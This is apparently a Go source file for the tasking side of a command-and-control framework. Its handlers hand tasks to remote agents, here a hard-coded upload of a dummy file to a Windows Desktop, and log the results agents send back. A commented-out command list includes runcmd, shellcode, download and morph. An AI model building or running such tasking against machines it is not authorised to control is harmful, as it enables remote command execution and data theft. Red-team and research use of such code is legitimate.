package router

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"numinon_shadow/internal/models"
	"os"
	"time"
)

// CheckinHandler processes requests from clients checking in for tasks.
func CheckinHandler(w http.ResponseWriter, r *http.Request) {

	agentID := r.Header.Get("Agent-ID") // Read the custom header
	log.Printf("|✅ CHK_IN| Received check-in %s from Agent ID: %s via %s", r.Method, agentID, r.RemoteAddr)

	var response models.ServerTaskResponse

	// Randomly decide if a task is available (50/50 chance).

	// A task is available, so populate the details.
	response.TaskAvailable = true
	response.TaskID = generateTaskID()

	// Randomly select a command.
	commands := []string{"hop"}
	response.Command = commands[0]

	//commands := []string{"runcmd", "upload", "download", "enumerate", "shellcode", "morph", "hop", "doesnotexist"}
	//response.Command = commands[seededRand.Intn(len(commands))]

	// HERE WE CREATE response.Data, UPLOAD SPECIFIC ARGUMENTS

	response.Data = models.UploadArgs{
		TargetDirectory: "C:\\Users\\vuilhond\\Desktop\\",
		TargetFilename:  "dummy.txt",
		FileContentBase64: func() string {
			fileBytes, err := os.ReadFile("./dummy/dummy.txt")
			if err != nil {
				panic(fmt.Errorf("failed to read prerequisite file ./dummy/dummy.txt: %w", err))
			}
			return base64.StdEncoding.EncodeToString(fileBytes)
		}(),
		ExpectedSha256: func() string {
			fileBytes, err := os.ReadFile("./dummy/dummy.txt")
			if err != nil {
				fmt.Println(err)
			}
			hashBytes := sha256.Sum256(fileBytes)
			return fmt.Sprintf("%x", hashBytes)
		}(),
		OverwriteIfExists: true,
	}

	// Assert that response.Data holds a models.UploadArgs struct.
	if uploadArgs, ok := response.Data.(models.UploadArgs); ok {
		// If 'ok' is true, the assertion succeeded.
		// 'uploadArgs' is now a variable of the correct type (models.UploadArgs).
		fmt.Printf("EXPLICIT DEBUG TO REVIEW ARGUMENTS\n"+
			"TargetDirectory: %s\n"+
			"TargetFilename: %s\n"+
			"FileContentBase64: %s\n"+
			"ExpectedSha256: %s\n"+
			"OverwriteIfExists: %v\n",
			uploadArgs.TargetDirectory,
			uploadArgs.TargetFilename,
			uploadArgs.FileContentBase64,
			uploadArgs.ExpectedSha256,
			uploadArgs.OverwriteIfExists,
		)
	} else {
		// This will run if response.Data does not contain a models.UploadArgs.
		fmt.Println("Error: response.Data is not the expected UploadArgs type")
	}

	// HERE UPLOAD SPECIFIC ARGUMENTS END

	log.Printf("|📌 TASK ISSUED| -> Sent command '%s' with TaskID '%s' to Agent %s\n", response.Command, response.TaskID, agentID)

	// Set the content type header to indicate a JSON response.
	w.Header().Set("Content-Type", "application/json")

	// Marshal the response struct into JSON.
	jsonResponse, err := json.Marshal(response)
	if err != nil {
		// If marshaling fails, log the error and send a server error response.
		http.Error(w, "Error creating response", http.StatusInternalServerError)
		return
	}

	// Write the JSON response to the client.
	w.WriteHeader(http.StatusOK)
	w.Write(jsonResponse)
}

func ResultsHandler(w http.ResponseWriter, r *http.Request) {

	agentID := r.Header.Get("Agent-ID")
	log.Printf("|✅ CHK_IN| Received results POST from Agent ID: %s via %s", agentID, r.RemoteAddr)

	// Read the raw body from the request
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("|❗ERR RESULT|-> Error reading result body from agent %s: %v\n", agentID, err)
		return
	}
	defer r.Body.Close()

	// --- PRETTY PRINT LOGIC STARTS HERE ---

	// 1. Unmarshal the raw JSON into our AgentTaskResult struct
	var result models.AgentTaskResult
	if err := json.Unmarshal(body, &result); err != nil {
		log.Printf("|❗ERR RESULT|-> Error unmarshaling result JSON from agent %s: %v\n", agentID, err)
		return
	}

	// Create a temporary struct for logging so we can display output as a string
	prettyResult := struct {
		TaskID string `json:"task_id"`
		Status string `json:"status"`
		Output any    `json:"output"` // Changed to string for display
		Error  string `json:"error"`
	}{
		TaskID: result.TaskID,
		Status: result.Status,
		Output: result.Output, // Convert byte slice to string here
		Error:  result.Error,
	}

	// 2. Re-marshal the struct into a "pretty" indented JSON string
	prettyJSON, err := json.MarshalIndent(prettyResult, "", "  ") // Using two spaces for indentation
	if err != nil {
		log.Printf("|❗ERR RESULT|-> Error re-marshaling for pretty printing: %v\n", err)
	}
	log.Printf("|✅ RESULT| Received results POST from Agent ID: %s via %s\n--- Task Result ---\n%s\n-------------------\n", agentID, r.RemoteAddr, string(prettyJSON))

	// --- PRETTY PRINT LOGIC ENDS HERE ---

	// Respond to the agent to confirm receipt
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Result received"))
}

// seededRand is a random number generator seeded at application start.
var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))

// generateTaskID creates a random task identifier.
func generateTaskID() string {
	return fmt.Sprintf("task_%06d", seededRand.Intn(1000000))
}
